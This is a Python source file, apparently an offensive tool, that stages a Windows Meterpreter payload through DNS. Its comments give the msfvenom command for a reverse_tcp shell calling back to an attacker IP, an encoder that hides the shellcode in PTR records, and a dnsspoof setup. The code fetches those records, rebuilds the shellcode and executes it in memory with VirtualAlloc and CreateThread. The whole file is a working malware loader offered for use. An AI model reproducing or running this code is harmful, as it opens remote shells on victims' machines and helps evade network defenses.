import dns.resolver
import dns.reversename
import re
import sys
import psutil
import ctypes
from ctypes import *

#   Time：2020/2/12
#   Author：f1ndme
#   Github_Add：

message = input("Please Input Your DNS_Server_IP(About 30 seconds):"+ "\n")
my_resolver = dns.resolver.Resolver()
my_resolver.nameservers = [message]
my_resolver.timeout = 3
my_resolver.lifetime = 3

# step.1
# msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp lhost=192.168.32.133 lport=5555 -f c > /root/safe/payload.txt

# step.2
# 将shellcode制作成  IP+地址 的格式
# Ipaddress "{payload}.domain.com"
# 1.1.1.0 "0xfc0x480x830xe40xf00xe8.1.com"
# 1.1.1.1 "0xbc0xc80x130xff0x100x08.1.com"
# python格式化
# #! /usr/bin/env python2.7
# # -*- coding:UTF-8 -*-
# a = ''
# f = open("payload.txt", "rb")
# line = f.readlines()[0:]
# f.close()
# for lines in range(len(line)):
#     ipls = '1.1.1.%s' % lines
#     shellcode = line[lines].replace(";","").strip().rstrip('"')+".1.com"+'"'
#     text = ipls + " " + '"'+ "0x"+shellcode.lstrip('"')
#     a += text.replace("\\","0")+"\n"
# fn = open("dns.txt", "wb")
# fn.write(a)

# step.3
#DNS_Server
#dnsspoof -i eth0 -f dns.txt
#listening msf

#setp.4
#Execute this python_scripts and input Your Bad_DNS_Server_IP

## DNS解析数据回传
num = 1
codes  = []
for i in range(34):
    ip = "1.1.1." + str(i)
    if num == 2:
        num = num-1
    while num < 2:
        try:
            qname = dns.reversename.from_address(ip)
            answer = my_resolver.query(qname, 'PTR')
            for rr in answer:
                #print(rr)
                if rr is not None:
                    codes.append(rr)
                    num = num + 1
        except:
            print("DNS解析超时，正在重新解析...")


##shellcode格式整理
pattern = re.compile(r'\w+')
nums=0
shellcode = b""
for nums in range(34):
    res = codes[nums]
    #print(res)
    code = pattern.findall(str(res))
    codess = ''.join(code[0].split('0x'))
    codess = bytes.fromhex(codess)
    shellcode += codess

shellcode = bytearray(shellcode)
# 设置VirtualAlloc返回类型为ctypes.c_uint64
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
# 申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

# 放入shellcode
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buf,
    ctypes.c_int(len(shellcode))
)
# 创建一个线程从shellcode防止位置首地址开始执行
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_uint64(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)
# 等待上面创建的线程运行完
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))



























